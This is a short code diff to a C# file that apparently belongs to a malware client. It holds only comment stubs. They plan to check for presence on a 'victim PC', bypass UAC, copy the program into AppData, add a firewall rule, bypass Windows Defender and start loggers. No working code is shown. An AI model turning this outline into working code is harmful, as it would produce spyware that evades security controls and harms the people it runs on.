@@ -16,13 +16,14 @@ namespace Client
             /// Check if Application is already on victim PC.
 
             /// Attempts to bypass UAC.
-            // If already in victim PC continue.
-            // If not in victim PC copy self to AppData Microsoft folder.
+            //  If already in victim PC continue.
+            //  If not in victim PC copy self to AppData Microsoft folder.
 
             /// Add current application to firewall rule.
             
-
             /// Bypass Windows defender.
+            
+            /// Start loggers.
         }
     }
 }
